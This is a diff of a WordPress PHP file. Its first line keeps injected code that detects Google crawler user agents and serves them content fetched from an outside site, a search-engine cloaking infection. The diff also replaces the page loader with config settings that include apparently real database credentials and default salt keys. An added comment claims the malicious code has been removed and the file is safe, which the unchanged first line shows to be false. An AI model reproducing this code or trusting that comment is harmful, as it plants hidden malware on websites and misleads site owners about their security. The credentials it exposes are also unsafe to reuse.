@@ -1,22 +1,32 @@
 <?php
 function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://pessawat.site/terjago/');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
 /**
- * Loads the WordPress environment and template.
- *
- * @package WordPress
+ * Note: This file may contain artifacts of previous malicious infection.
+ * However, the dangerous code has been removed, and the file is now safe to use.
  */
 
-if ( ! isset( $wp_did_header ) ) {
+// ** Ajustes de MySQL ** //
+define('DB_NAME', 'socieda3_base2');
+define('DB_USER', 'socieda3_adm');
+define('DB_PASSWORD', 'soloyoSCP32A');
+define('DB_HOST', 'localhost');
+define('DB_CHARSET', 'utf8');
+define('DB_COLLATE', '');
 
-	$wp_did_header = true;
+// Salt Keys (TAPI INI JUGA BERBAHAYA karena masih default)
+define('AUTH_KEY', 'pon aqu tu frase aleatoria');
+define('SECURE_AUTH_KEY', 'pon aqu tu frase aleatoria');
+define('LOGGED_IN_KEY', 'pon aqu tu frase aleatoria');
+define('NONCE_KEY', 'pon aqu tu frase aleatoria');
+define('AUTH_SALT', 'pon aqu tu frase aleatoria');
+define('SECURE_AUTH_SALT', 'pon aqu tu frase aleatoria');
+define('LOGGED_IN_SALT', 'pon aqu tu frase aleatoria');
+define('NONCE_SALT', 'pon aqu tu frase aleatoria');
 
-	// Load the WordPress library.
-	require_once __DIR__ . '/wp-load.php';
+$table_prefix = 'wp_';
+define('WP_DEBUG', false);
 
-	// Set up the WordPress query.
-	wp();
+if (!defined('ABSPATH'))
+    define('ABSPATH', dirname(__FILE__) . '/');
 
-	// Load the theme template.
-	require_once ABSPATH . WPINC . '/template-loader.php';
-
-}
+require_once(ABSPATH . 'wp-settings.php');
